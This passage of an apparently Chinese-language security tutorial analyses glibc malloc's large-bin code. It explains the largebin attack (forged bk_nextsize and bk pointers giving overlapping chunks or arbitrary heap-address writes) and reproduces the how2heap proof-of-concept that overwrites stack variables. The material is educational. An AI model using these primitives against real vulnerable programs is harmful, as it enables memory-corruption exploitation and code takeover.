fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size) <span class="hljs-comment">//第四步，如果插入的chunk不为最小，则通过`fd_nextsize`从大到小遍历chunk，找到小于等于要插入chunk的位置</span><br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd; <span class="hljs-comment">//第五步，如果存在堆头，则插入到堆头的下一个节点</span><br>                      <span class="hljs-keyword">else</span><br>                        &#123; <span class="hljs-comment">//第六步，否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span>   <span class="hljs-comment">//第二步，chunk对应的largebin index中为空</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          <span class="hljs-comment">//设置fd与bk，完成插入</span><br>          victim-&gt;bk = bck; <br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br>          ...<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>上述源码分析总结为：</p>
<ol>
<li>找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunk<code>bck</code>和最大的chunk<code>fwd</code>。</li>
<li>如果<code>fwd</code>等于<code>bck</code>，表明当前链表为空(因为fd，bk将会链接到main_arena上，所以一旦存在堆块，则必然不相等)，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将<code>bk_nextsize</code>和<code>fd_nextsize</code>赋值为它本身。</li>
<li>如果<code>fwd</code>不等于<code>bck</code>，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，<code>(size) &lt; (bck-&gt;bk-&gt;size)</code>，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将<code>bk_nextsize</code>指向比它大的堆头，<code>fd_nextsize</code>指向双链表的第一个节点即最大的堆头。</li>
<li>如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过<code>fd_nextsize</code>进行遍历，由于<code>fd_nextsize</code>指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。</li>
<li>如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。</li>
<li>如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置<code>fd_nextsize</code>与<code>bk_nextsize</code>。</li>
</ol>
<p>然后分析large bin 被申请分配时的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br>     <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>       &#123;<br>         bin = bin_at (av, idx); <span class="hljs-comment">//找到申请的size对应的largebin链表</span><br><br>         <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>         <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>             (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb)) <span class="hljs-comment">//第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size</span><br>           &#123;<br>             victim = victim-&gt;bk_nextsize; <br>             <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size = chunksize (victim)) &lt;<br>                     (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb))) <span class="hljs-comment">//第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span><br>               victim = victim-&gt;bk_nextsize; <br><br>             <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                list does not have to be rerouted.  */</span><br>             <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="hljs-comment">//第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span><br>               victim = victim-&gt;fd;<br><br>             remainder_size = size - nb;<br>             unlink (av, victim, bck, fwd); <span class="hljs-comment">//第四步，largebin unlink 操作</span><br><br>             <span class="hljs-comment">/* Exhaust */</span><br>             <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) <span class="hljs-comment">//第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户</span><br>               &#123;<br>                 set_inuse_bit_at_offset (victim, size);<br>                 <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   victim-&gt;size |= NON_MAIN_ARENA;<br>               &#125;<br>             <span class="hljs-comment">/* Split */</span><br>             <span class="hljs-keyword">else</span><br>               &#123;<br>                 remainder = chunk_at_offset (victim, nb); <span class="hljs-comment">//第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中。</span><br>                 <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>                 bck = unsorted_chunks (av);<br>                 fwd = bck-&gt;fd;<br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                   &#123;<br>                     errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                     <span class="hljs-keyword">goto</span> errout;<br>                   &#125;<br>                 remainder-&gt;bk = bck;<br>                 remainder-&gt;fd = fwd;<br>                 bck-&gt;fd = remainder;<br>                 fwd-&gt;bk = remainder;<br>                 <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                   &#123;<br>                     remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                     remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                   &#125;<br>                 set_head (victim, nb | PREV_INUSE |<br>                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                 set_head (remainder, remainder_size | PREV_INUSE);<br>                 set_foot (remainder, remainder_size);<br>               &#125;<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure>

<p>上述源码分析总结为：</p>
<ol>
<li>找到当前要申请的空间对应的largebin链表，判断第一个结点即最大结点的大小是否大于要申请的空间，如果小于则说明largebin中没有合适的堆块，需采用其他分配方式。</li>
<li>如果当前largebin中存在合适的堆块，则从最小堆块开始，通过<code>bk_nextsize</code>反向遍历链表，找到大于等于当前申请空间的结点。</li>
<li>为减少操作，判断找到的相应结点（堆头）的下个结点是否是相同大小的堆块，如果是的话，将目标设置为该堆头的第二个结点，以此减少将<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值的操作。</li>
<li>调用<code>unlink</code>将目标largebin chunk从双链表中取下。</li>
<li>判断剩余空间是否小于MINSIZE，如果小于直接返回给用户。</li>
<li>否则将剩余的空间构成新的chunk放入到unsorted bin中。</li>
</ol>
<p>最后看 unlink 源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">if</span> (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-meta-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                     \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                     \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))         \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">else</span> &#123;                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                    \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                    \</span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)              \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;          \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \</span><br><span class="hljs-meta">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">        malloc_printerr (check_action,              \</span><br><span class="hljs-meta">             <span class="hljs-meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">             P, AV);                \</span><br><span class="hljs-meta">            <span class="hljs-meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;              \</span><br><span class="hljs-meta">                <span class="hljs-meta-keyword">if</span> (P-&gt;fd_nextsize == P)              \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;         \</span><br><span class="hljs-meta">                <span class="hljs-meta-keyword">else</span> &#123;                    \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;           \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;           \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;           \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;           \</span><br><span class="hljs-meta">                  &#125;                   \</span><br><span class="hljs-meta">              &#125; <span class="hljs-meta-keyword">else</span> &#123;                    \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;         \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;         \</span><br><span class="hljs-meta">              &#125;                     \</span><br><span class="hljs-meta">          &#125;                     \</span><br><span class="hljs-meta">      &#125;                       \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure>

<p>从源码中可以看到，就是多了<code>fd_nextsize</code>和<code>bk_nextsize</code>两个位置的检查，原理和<code>fd</code>和<code>bk</code>的检查一致。需要注意的是对于存在多个满足空间的堆块来说，申请出来的是堆头的下一个结点，它的<code>fd_nextsize</code>和<code>bk_nextsize</code>为空，不满足条件<code>__builtin_expect (P-&gt;fd_nextsize != NULL, 0)</code>，因此只会像smallbin的unlink一样检查<code>fd</code>与<code>bk</code>，而不会对<code>fd_nextsize</code>与<code>bk_nextsize</code>进行检查与操作。</p>
<h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>largebin attack是在largebin双链表的插入与取下的过程中出现问题，导致可以被申请出非预期内存的情形，方式大致有两种：</p>
<ul>
<li>在申请 large bin 的过程中，伪造largebin的<code>bk_nextsize</code>，实现非预期内存申请。</li>
<li>在 large bin 插入的过程中，伪造largebin的<code>bk_nextsize</code>以及<code>bk</code>，实现任意地址写堆地址。</li>
</ul>
<h3 id="伪造-bk-nextsize"><a href="#伪造-bk-nextsize" class="headerlink" title="伪造 bk_nextsize"></a>伪造 bk_nextsize</h3><p>原理：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>             (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb)) <span class="hljs-comment">//判断链表的第一个结点，即最大的chunk是否大于要申请的size</span><br>           &#123;<br>             victim = victim-&gt;bk_nextsize; <br>             <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size = chunksize (victim)) &lt;<br>                     (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb))) <span class="hljs-comment">//从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span><br>               victim = victim-&gt;bk_nextsize;  <span class="hljs-comment">//漏洞点，伪造bk_nextsize</span><br><br>             <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="hljs-comment">//申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span><br>               victim = victim-&gt;fd;<br><br>             remainder_size = size - nb;<br>             unlink (av, victim, bck, fwd); <span class="hljs-comment">//largebin unlink 操作</span><br> <br>     ... <br>     <span class="hljs-keyword">return</span> p;<br></code></pre></td></tr></table></figure>

<p>此利用方式是在申请largebin的过程中出现。回到申请largebin的源码中去看，它先判断当前双链表中存在满足申请需求的堆块（判断第一个堆块的大小），然后通过<code>bk_nextsize</code>反向遍历双链表找到第一个大于申请需求的堆块，申请该堆头对应的堆块。</p>
<p>问题出现在通过<code>bk_nextsize</code>反向遍历双链表的过程，如果能够伪造某个堆头结点中的<code>bk_nextsize</code>，将其指向非预期的内存地址，构造好数据使得非预期内存地址在通过unlink的检查之后，会将该空间返回给用户，最终使得可以申请出非预期的内存。最常见的就是用来构造overlap chunk。</p>
<p>典型应用场景：存在四个堆ABCD，largebin中存在链表A-&gt;B，其中A为0x420，B为0x400，C为0x410，C未释放。将B的<code>bk_nextsize</code>伪造指向C，同时将C的<code>fd</code>与<code>bk</code>构造好，将C的<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值为0，当申请0x410大小的内存E时，遍历<code>B-&gt;bk_nextsize</code>会指向C，且C的大小满足需求，因此会调用unlink将C从双链表取下，因此申请出来的堆块E的地址会为C的地址，即E和C为同一内存块，实现overlap chunk的构造。</p>
<p>所以需要的利用条件为：</p>
<ul>
<li>释放堆块存在UAF，能伪造 bk_nextsize</li>
<li>存在一块可控内存，其 size 要满足申请要求；同时伪造其 fd、bk 指针绕过unlink，其余清零即可</li>
</ul>
<h3 id="伪造-bkl-nextsize-、-bk"><a href="#伪造-bkl-nextsize-、-bk" class="headerlink" title="伪造 bkl_nextsize 、 bk"></a>伪造 bkl_nextsize 、 bk</h3><p>原理：</p>
<p>此利用方式是在将 unsorted bin 中的 chunk 取下，插入到largebin中出现的。回到largebin形成的代码中，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><br>...<span class="hljs-comment">//将largebin从unsorted bin中取下</span><br>    unsorted_chunks (av)-&gt;bk = bck;<br>    bck-&gt;fd = unsorted_chunks (av);<br>    <br>    ...<br>    <br>                    victim-&gt;fd_nextsize = fwd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="hljs-comment">//由于fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span><br>                    fwd-&gt;bk_nextsize = victim;<br>                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="hljs-comment">//victim-&gt;bk_nextsize可控，因此实现了往任意地址写victim的能力</span><br>                  &#125;<br>                bck = fwd-&gt;bk; <span class="hljs-comment">//由于fwd-&gt;bk可控，因此bck可控</span><br>           ...<br><br>    mark_bin (av, victim_index);<br>    <span class="hljs-comment">//设置fd与bk完成插入</span><br>    victim-&gt;bk = bck; <br>    victim-&gt;fd = fwd;<br>    fwd-&gt;bk = victim;<br>    bck-&gt;fd = victim; <span class="hljs-comment">//bck可控，因此实现了往任意地址写victim的能力</span><br>    ...<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>该攻击方式可实现两次往任意的地址写堆地址的能力，设任意地址为<code>evil_addr</code>，问题出现在当前的largebin插入为堆头的过程，在此过程中假设我们可控 largebin 中的<code>bk_nextsize</code>与<code>bk</code>。</p>
<p>一次是：控制<code>fwd-&gt;bk_nextsize</code>指向<code>evil_addr-0x20</code>。执行完<code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>后，<code>victim-&gt;bk_nextsize</code>也为<code>evil_addr-0x20</code>，接着执行<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>即实现了往<code>evil_addr-0x20-&gt;fd_nextsize</code>写victim，即往<code>evil_addr</code>写victim地址。关键两行代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="hljs-comment">//由于fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span><br>...<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="hljs-comment">//victim-&gt;bk_nextsize可控，因此实现了往任意地址写victim的能力</span><br></code></pre></td></tr></table></figure>

<p>另一次是：控制<code>fwd-&gt;bk</code>指向<code>evil_addr-0x10</code>，执行完<code>bck = fwd-&gt;bk</code>后，<code>bck</code>为<code>evil_addr-0x10</code>，接着执行<code>bck-&gt;fd = victim</code>即往<code>evil_addr-0x10-&gt;fd</code>写victim，即往<code>evil_addr</code>写victim地址。关键两行代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">bck = fwd-&gt;bk; <span class="hljs-comment">//由于fwd-&gt;bk可控，因此bck可控</span><br>...<br>bck-&gt;fd = victim; <span class="hljs-comment">//bck可控，因此实现了往任意地址写victim的能力</span><br></code></pre></td></tr></table></figure>

<p>这样利用伪造在largebin中的<code>bk_nextsize</code>与<code>bk</code>，我们获得了两次往任意地址写入堆地址的能力。</p>
<p>一个比较好的目标是写<code>global_max_fast</code>，使得可以将其覆盖成很大的值</p>
<p>利用条件：</p>
<ul>
<li>具有UAF，修改 large bin chunk 的 bk、bk_nextsize</li>
<li>被修改的 large bin chunk 的 size 要小于从 unsorted bin 取下放入 large bin的 chunk 的 size</li>
<li>从 unsorted bin 取下放入 large bin的 chunk 要能成为堆头</li>
</ul>
<p>可根据下面来自how2heap的poc进行手动学习</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    This technique is taken from</span><br><span class="hljs-comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">              else</span><br><span class="hljs-comment">              &#123;</span><br><span class="hljs-comment">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="hljs-comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="hljs-comment">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="hljs-comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">              &#125;</span><br><span class="hljs-comment">              bck = fwd-&gt;bk;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    mark_bin (av, victim_index);</span><br><span class="hljs-comment">    victim-&gt;bk = bck;</span><br><span class="hljs-comment">    victim-&gt;fd = fwd;</span><br><span class="hljs-comment">    fwd-&gt;bk = victim;</span><br><span class="hljs-comment">    bck-&gt;fd = victim;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span><br><span class="hljs-comment">    please check the Background section in the aforementioned link.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>           <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>            <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>            <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p3[<span class="hljs-number">0</span>]));<br> <br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>            <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>            <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>            <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">//------------------------------------</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>            <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-keyword">void</span> *)stack_var1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-keyword">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h4><p>house-of-storm，利用伪造在largebin中的bk_nextsize、bk获得任意地址写入堆地址与unsorted bin attack的结合可以使得该利用方法变成任意可以内存申请的攻击方式。</p>
